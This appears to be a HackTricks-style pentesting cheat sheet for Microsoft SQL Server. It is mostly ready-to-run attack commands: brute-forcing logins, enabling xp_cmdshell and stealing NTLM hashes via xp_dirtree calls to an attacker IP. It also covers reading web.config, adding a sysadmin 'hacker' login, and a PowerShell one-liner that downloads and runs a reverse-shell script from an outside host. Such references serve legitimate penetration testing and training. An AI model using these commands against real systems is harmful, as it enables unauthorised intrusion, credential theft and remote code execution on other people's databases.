1433 - Pentesting MSSQL - Microsoft SQL Server
Basic Information

 Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).
From wikipedia.

Default port: 1433

1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM

Search for exploits/scripts/auxiliary modules that can be helpful to find vulnerabilities in this kind of service:

searchsploit "microsoft sql server"
nmap --script-help "*ms* and *sql*"
msf> search mssql

Information
Default MS-SQL System Tables

    master Database : Records all the system-level information for an instance of SQL Server.

    msdb Database : Is used by SQL Server Agent for scheduling alerts and jobs.

    model Database : Is used as the template for all databases created on the instance of SQL Server. Modifications made to the model database, such as database size, collation, recovery model, and other database options, are applied to any databases created afterwards.

    Resource Database : Is a read-only database that contains system objects that are included with SQL Server. System objects are physically persisted in the Resource database, but they logically appear in the sys schema of every database.

    tempdb Database : Is a work-space for holding temporary objects or intermediate result sets.

Info Gathering

If you don't know nothing about the service:

nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping

If you don't have credentials you can try to guess them. You can use nmap or metasploit. Be careful, you can block accounts if you fail login several times using an existing username.
Metasploit

#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used
​
#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder
​
#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump
​
#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf
​
#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin
​
#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload
​
#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass

​Brute force​
Tricks
Execute commands

#Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
#Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
​
#this turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#this enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'

NTLM Service Hash gathering

​You can extract the NTLM hash of the user making the service authenticate against you.
You should start a SMB server to capture the hash used in the authentication (impacket-smbserver or responder for example).

xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer

Abusing MSSQL trusted Links

​Read this post to find more information about how to abuse this feature
Read files executing scripts (Python and R)

MSSQL could allow you to execute scripts in Python and/or R. These code will be executed by a different user than the one using xp_cmdshell to execute commands.

Example trying to execute a 'R' "Hellow World!" not working:

Example using configured python to perform several actions:

#Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO

From db_owner to sysadmin

​If you have the credentials of a db_owner user​, you can become sysadmin and execute commands​

msf> use auxiliary/admin/mssql/mssql_escalate_dbowner

Impersonation of other users

​IMPERSONATE privilege can lead to privilege escalation in SQL Server.​

msf> auxiliary/admin/mssql/mssql_escalate_execute_as

Using MSSQL for Persistence

​https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/​
Having credentials
Mssqlclient.py

You can login into the service using impacket mssqlclient.py

mssqlclient.py  -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> #Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine
​
#Once logged in you can run queries:
SQL> select @@ version;
​
#Steal NTLM hash
sudo responder -I <interface> #Run that in other console
SQL> exec master..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' #Steal the NTLM hash, crack it with john or hashcat
​
#Try to enable code execution
SQL> enable_xp_cmdshell
​
#Execute code, 2 sintax, for complex and non complex cmds
SQL> xp_cmdshell whoami /all
SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

sqsh

sqsh -S <IP> -U <Username> -P <Password> -D <Database>

Manual

SELECT name FROM master.dbo.sysdatabases #Get databases
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES; #Get table names
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
sp_addsrvrolemember 'hacker', 'sysadmin'

Post Explotation

The user running MSSQL server will have enabled the privilege token SeImpersonatePrivilege.
You probably will be able to escalate to Administrator using this token: Juicy-potato​
Shodan

    port:1433 !HTTP


Brute force

#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be carefull with the number of password in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be carefull, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
